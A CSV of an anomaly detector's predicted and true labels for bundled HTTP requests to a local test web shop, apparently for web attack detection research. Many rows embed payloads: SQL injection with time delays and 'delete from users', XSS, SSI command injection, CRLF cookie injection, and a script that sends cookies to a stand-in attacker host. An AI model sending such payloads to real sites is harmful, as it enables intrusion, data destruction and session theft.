data,y_pred,y_test
"gethttp://localhost:8080/tienda1/publico/4861362529278789730 posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=+&login=mototsun&password=longitudinalmente&nombre=pedro&apellidos=berlingery&email=thrush_orhonsay6@aadsl.no&dni=23532443q&direccion=c/+polacas,+59+1?f&ciudad=cubo+de+bureba&cp=12170&provincia=salamanca&ntc=6489953845851590&b1=registrar gethttp://localhost:8080/tienda1/global/titulo.jsp/asf-logo-wide.gif/.bak posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=vino+rioja&precio=39&cantidad=86&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=torok&password=03f3so&nombre=noel+stefani&apellidos=vilaseca+regalado&email=howell@zarasalud.mw&dni=17400980p&direccion=duran+i+*borrell,+22++3?d&ciudad=fontiveros&cp=49254&provincia=guadalajara&ntc=4507218709160906&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/imagenes.old gethttp://localhost:8080/tienda1/publico/productos.jsp/asf-logo-wide.gif gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=somppi&password=paparote&nombre=juliana&apellidos=vilardaga+bedmar&email=gardner-zimmer@alfombra.com.in&dni=79288923b&direccion=vitoria,+185+3?a&ciudad=bahab�n&cp=17464&provinciaa=vizcaya&ntc=6889929680639431&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=melfi&pwd=espesamente&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob@<script>alert(paros)</script>.parosproxy.org&pwd=�12�a&remember=on&b1=entrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7495&b1=pasar+por+caja/ posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1+ gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=olivia&password=pa-lta&nombre=clidanor&apellidos=weffer+vaamonde""><!--#exec+cmd=""dir+""--><&email=dozier@interanuncios.li&dni=58040403h&direccion=vista+alegre+90,+&ciudad=copons&cp=43143&provincia=valladolid&ntc=4437841608475479&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito|",anomalous,anomalous
gethttp://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=barkhous&pwd=9ed7ro&remember=off&b1a=entrar gethttp://localhost:8080/_vti_bin/ gethttp://localhost:8080/tienda1/asf-logo-wide.gif.old gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=roanne&password=3un09o&nombre=odila&apellidos=bologna&email=prendes@gia.com.kp%20&dni=79531407y&direccion=calle+sor+eulalia,+s/n+&ciudad=pi�rnigas&cp=34447&provincia=madrid&ntc=0884274340898126&b1=registrar gethttp://localhost:8080/webspheresamples/ posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=don&pwd=co4tro5ersa&remember=@40&b1=entrar",normal,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=merlina&pwd=si6bionte&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7749&b1a=confirmar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100/&cantidad=61&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727 gethttp://localhost:8080/tienda1/publico/registro.jsp/6909030637832563290.jsp,anomalous,anomalous
"gethttp://localhost:8080/asf-logo-wide.inc gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a gethttp://localhost:8080/asf-logo-wide posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=asad&apellidos=tarraubella+grajera&email=seward_sepulvede@promotorareina.bt&dni=577b80594v&direccion=cuesta+del+mercadillo,+30+&ciudad=valdemeca&cp=44367&provincia=palencia&ntc=2588788031004045&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6992&b1=pasar+por+caja/",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/entrar.jsp/4861362529278789730.java posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2'+and+'1'='1 posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=suthers&password=8untu7s6&nombre=ren�e&apellidos=aldeta+marnetti&email=patterson@arrsys.ke&dni=88453156d&direccion=camino+de+los+robles,+8+&ciudad=caparroso&cp=43694&provincia=alicant/e&ntc=4200323097821168&b1=registrar",anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precioa=85&cantidad=75&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/index.jsp/.old gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas%7c posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=6838&b1=confirmar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sysint9&pwd=l2n7at8s55&remember=on&b1=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo='injected_param&precio=8977&b1=pasar+por+caja gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=crickard&password=chofe&nombre=-+va+lfredo&apellidos=blancas+sol�rzano&email=billingsley@yksoluap.sr&dni=44614622g&direccion=gibraltar,+160+&ciudad=cogollos&cp=10189&provincia=cuenca&ntc=2593497468791354&b1=registrar gethttp://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.gif/ posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=','0','0','0','0');waitfor+delay+'0:0:15';--&precio=9014&b1=confirmar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sawyers&password=encumb2ad3&nombre=max&apellidos=ve,rjaga+figarola&email=tamburi@hispadis.ar&dni=30293636z&direccion=c/+virgen+de+las+angustias+122+4?a&ciudad=fuentespina&cp=48220&provincia=asturias&ntc=8898020239162472&b1=registrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%2b gethttp://localhost:8080/theme posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasparos%22%20style=%22background:url(javascript:alert('paros')) posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6244&b1=%7c",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=zaretsky&pwda=40c7c0o&remember=off&b1=entrar gethttp://localhost:8080/agentrunner.nsf posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jowett&password=2�082es&nombre=malco&apellidos=fresquet+giuggia&email=moriaty.suchima@vendomiatico.at&dni=34012270p&direccion=c/+codigo+apartados+particulares+oficiales+y+lista+94,+3?e&ciudad=vall+de*.+card�s&cp=09613&provincia=salamanca&ntc=1543672181801522&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&pwd=c69p04e13&remember=off&b1=entrar gethttp://localhost:8080/web-inf/web.xml",anomalous,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lowe&password=26ti8er2st5ltic9&nombre=nathaniel&apellidos=ledesma+pall�s&email=durning_assaf@nutrimama.ie&dni=77753227w&direccion=calle+h*elsinki,*+78,+&ciudad=calafell&cp=33800&provincia=cantabria&ntc=5488808087081564&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombrea=vino+rioja&precio=85&cantidad=61&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registroand+1=1&login=shanti&password=asolapar&nombre=meyer&apellidos=balsells+fit�&email=meeker_komorowska@noviasteresapalacios.mx&dni=19254444v&direccion=calle+santo+domingo,+163+&ciudad=lapoblaci�n&cp=43762&provincia=salamanca&ntc=3963417251339822&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=c?hak-ho,n&pwd=es699601r&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=3546&b1=confirmar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7625&b1=confirmar/ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&logina=sena&password=mata_3olvo&nombre=rut&apellidos=valiente+mu�umer&email=lanyon_guerrasio@automovilesalhambra.um&dni=97238430l&direccion=calle+granada,+85+&ciudad=monistrol+de+calders&cp=10140&provincia=le�n&ntc=9959544300389605&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=adriene&password=ch28uel2&nombre=magina&apellidos=cabrales+poca&email=thornbury@erasmusrooms.name&dni=71625075q&direccion=carretera+antiga+d'horta+a+cerdanyola,+41,+10?f&ciudad=cistierna&cp=24439&provincia=hues./ca&ntc=9326795669017614&b1=registrar gethttp://localhost:8080.java gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito",normal,anomalous
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=39&cantidad=3&b1=a�adir+al+carrito gethttp://localhost:8080/estore/annotated-index.html gethttp://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif.inc gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif/.java posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4296&b1a=confirmar,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=ques+o+manchego&precio=39&cantidad=75&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1867&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=85&cantidad=10&b1a=a�adir+al+carrito,anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide.gif gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=843&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hisko&pwd=alberc8'q4,ero&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kou-yuan&pwd=+pul3a53ra&remember=on&b1a=entrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=/dame?na&password=trufaldina&nombre=yadia&apellidos=puerta+garreta&email=fleur@drae2.kh&dni=52864416c&direccion=parque+de+despe�aperros,+159+&ciudad=algerri&cp=47175&provincia=zaragoza&ntc=9535422521832781&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=vino+rioja&precio=85&cantidad=76&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=715&b1=pasar+por+caja'+delete+from+users posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yueping1&password=f9e2dora&nombre=harissa&apellidos=aregall+picabea&email=goorwitz-sejbalova@hostingprofessional.com.jobs&dni='2641170p&direccion=risue�o+141,+&ciudad=font+d'en+carr�s,+la&cp=29551&provincia=huelva&ntc=3999806738331009&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2",anomalous,anomalous
gethttp://localhost:8080/iisstart.htm gethttp://localhost:8080/samples/htmlsamp/styles2.htm gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8650&b1=confirmar/ puthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,normal,anomalous
"gethttp://localhost:8080/tienda1/publico/4861362529278789730.bak posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas%7c gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=','0');waitfor+delay+'0:0:15';--&cantidad=18&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=ques+o+manchego&precio=39&cantidad=94&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=art?us&password=a5to4iro&nombre=ari&apellidos=pejoan+ang�s&email=rosenthal@tintasultravioleta.pm&dni=97428883d&direccion=damian+de+castro,+52,+&ciudad=godojos&cp=43420&provincia=c�rdoba&ntc=5864494451512907&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dawn8&password=0h8buqu�&nombre=quinciano&apellidos=manzanera+agudo&email='+delete+from+users&dni=11051114m&direccion=c/+poceros,+29,+&ciudad=anna&cp=37797&provincia=ourense&ntc=5688192527960477&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=vino+rioja&precio=39&cantidad=4&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=dombrosk&password=velu!dillo&nombre=quincio&apellidos=rezabal&email=omiya_bogetti@casablancabeach.gob&dni=77720635r&direccion=calle+arrozal+110,+3?g&ciudad=artesa+de+segre&cp=16336&provincia=castell�n&ntc=4597794127827518&b1=registrar gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/imagenes.bak posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tonie&password=fu43on2r&nombre=ravi&apellidos=mascarell+yomona&email=payson_hoven@quecole.za&dni=05111871y&direccion=c/+conde+oliveto+s/n,+&ciudad=taradell&cp=19247&provincia=�vila&ntc=7846969771020065&b1a=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script> gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%3f&precio=909&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=rasmira&apellidos=pavi�+pool&email=gloves@sms24h.mk&dni=92795576y&direccion=calle+jose+luis+de+arrese,+105+1?f&ciudad=ger&cp=24370&provincia=','0');waitfor+delay+'0:0:15';--&ntc=7563981891605435&b1=registrar gethttp://localhost:8080/iissamples/exair/dfault.asp gethttp://localhost:8080/tienda1/miembros/6909030637832563290.jsp.java",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cristion&pwd=l8730ea&remember=off&b1a=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6771&b1=confirmar/ gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=540&b1a=pasar+por+caja gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=helem&password=aparecer&nombre=pancho&apellidos=goldaratz+brizuela&email=lahbib_hodo@silver-knights.ie&dni=54489862x&direccion=berlin+116+&ciudad=sudanell&cp=24346&provincia=burgos&ntc=011349048658532&b1=registrar gethttp://localhost:8080/tienda1/imagenes/2.gif/6909030637832563290.jsp,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/miembros/fotos.jsp/asf-logo-wide.gif.old gethttp://localhost:8080/tienda1/publico.bak posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tomohiro&pwd=cacoquimia&remember=off&b1='injected_param gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasany%0d%0aset-cookie%3a+tamper%3d5765205567234876235,anomalous,anomalous
"gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif/4861362529278789730.inc gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito','0','0','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/6909030637832563290.jsp posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=darryl&pwda=cala��s&remember=off&b1=entrar puthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=correa&password=5ortera&nombre=fructuosa&apellidos=polloni+homdedeu&email=berto@sindualidad.dd&dni=49742539w&direccion=c/+einstein,+147,+9?a&ciudad=legazpi&cp=44349&provincia=valencia&ntc=2169388539628734&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235 posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp/4861362529278789730.bak posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=69&b1a=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide.gif,anomalous,anomalous
"puthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=3&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leonerd&password=6a6o57a&nombre=christopher&apellidos=silva&email=havoc8@g-audi.eg&dni=56405919y&direccion=c/+miquel+palomares,+73+7?c&ciudad=bidegoian&cp=16415&provincia=almer�a&ntc=7329932302042221&b1=registrar'injected_param gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=merlina&password=l12o3o&nombre=heloisa&apellidos=senini&email=odea-chua@prestigecars.de&dni=1775107'h&direccion=passatge+amerigo,+164,+&ciudad=valdeltormo&cp=46175&provincia=zamora&ntc=4467025067468073&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vehling&password=cargadas&nombre=rodipo&apellidos=peteiro&email=szmidt@surcosur.id&dni=64709043s&direccion=calle+ourense+119+5?f&ciudad=puerto+real&cp=2632a&provincia=guadalajara&ntc=0132612345545070&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rourke&password=d.iclino&nombre=yulisa','0');waitfor+delay+'0:0:15';--&apellidos=atondo+kan&email=oak@cpanelhost.com.be&dni=29170567n&direccion=c/+driza,+63+11-d&ciudad=fuensalda�a&cp=02461&provincia=�vila&ntc=6074458836046165&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9457&b1=confirmar/ gethttp://localhost:8080/tienda1/miembros/fotos.jsp.java posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=witchlow&password=d7rceo&nombre=irla&apellidos=de+la+cruz+milena&email=sternberg@rudos.ai&dni=12852429y&direccion=calle+mecerreyes,+149+&ciudad=castrillo+de+don+juan&cp=44147&provincia=valen?ci?a&ntc=4329593989444805&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=any%3f%0aset-cookie%3a+tamper%3d5765205567234876235 gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%7c&login=bassigna&pwd=recercar&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=4564&b1=confirmar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2542&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%20 gethttp://localhost:8080/alog.nsf gethttp://localhost:8080/tienda1/index.jsp/4861362529278789730 gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tjia&password=ajenamiento&nombre=am�rica&apellidos=gramunt+alzuria&email=anglim@emepleo.bj&dni=56967582d&direccion=pl.+jose+asenjo+sedano,+106+&ciudada=benitagla&cp=08186&provincia=barcelona&ntc=7288239379132371&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2352&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=han-fei&password=espuenda&nombre=?ba.s-iana&apellidos=barril+scifo&email=noel-noel.abel-gance@videocasa-ebs.yu&dni=88159654x&direccion=calle+luis+i+165+10a&ciudad=castrillo+de+la+guare�a&cp=43830&provincia=albacete&ntc=6015225993356578&b1=registrar gethttp://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide",anomalous,anomalous
gethttp://localhost:8080/tienda1/4861362529278789730.java gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=zaretsky&pwda=40c7c0o&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=poliwoda&password=enigmatista&nombre=tarciano&apellidos=cam�+tordera&emaila=nardo@codwatw.lk&dni=08762650h&direccion=federico+landrove+moi�o+105+3-g&ciudad=goizueta&cp=19360&provincia=alicante&ntc=7171983347621063&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6801&b1=confirmar/ gethttp://localhost:8080/tienda1/miembros/6909030637832563290.jsp.bak,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=85&cantidad=','0','0');waitfor+delay+'0:0:15';--&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nazanin&password=_colear&nombre=washingt+on&apellidos=collantes+cartaya&email=nieva@menorca.com.sz&dni=24778234n&direccion=masia+can+mas+carren�a,+193,+6-f&ciudad=huerta+del+marquesado&cp=30360&provincia=castell�n&ntc=5326981690610617&b1=registrar gethttp://localhost:8080/webspheresamples/ posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=roig&password=a4ev1l19&nombre=ra�l&apellidos=/a-musquivar+lem*bomba&email=munshin@cirugiaplasticacordoba.hk&dni=42473286z&direccion=avda.+sanlucar+de+barrameda+78+5-b&ciudad=alcaraz&cp=40291&provincia=huesca&ntc=4538972829961563&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=gamaliel&pwd=embelesar&remember=on&b1=entrar",anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=285&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=soucie6&pwd=3fistol23&remember=off/&b1=entrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito+ gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ashley&pwda=0axmord�n&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235,anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hernzlia&password=7etu,a&nombre=osorio&apellidos=mans+vi�as&email=sone@tristanyvioletina.nf&dni=70806659d&direccion=c/+lago+ba�olas+40+&ciudad=villarluengo&cp=41870&provincia=cantabria&ntc=3259495581211566&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=4564&b1=confirmar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&nombre=jam�n+ib�rico&precio=100&cantidad=47&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chi-yin&password=zafio&nombre=amael&apellidos=casselle+cullell&email=vacey@madrid2012.kw&dni=70541156h&direccion=plza.+agueda+diez,+25+10?b&ciudad=fuentes*+de+r*opel&cp=19415&provincia=cantabria&ntc=0891865623205844&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3375&b1a=pasar+por+caja",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=antinucc&password=zullarse&nombre=jos�+mar�a&apellidos=rodrigo+ambr�s&email=leibman@softstylestudio.be&dni=90993097z&direccion=urbanizacion+residencial+ronda+36+9?b&ciudad=riells+i+viabrea&cp=42150&provincia=teruel&ntc=9974355200418178&b1=';waitfor+delay+'0:0:15';-- gethttp://localhost:8080/_vti_log/ posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=daesik2&password=24�58ca1e581&nombre=panciano&apellidos=masc�+pr*.ado&email=dorsay.thursby@elrincondelmarmol.pr&dni=51834543h&direccion=cabo+de+agua,+s/n+&ciudad=villafranca+de+los+barros&cp=21240&provincia=ja�n&ntc=8319637256237029&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=5506&b1=pasar+por+caja",anomalous,anomalous
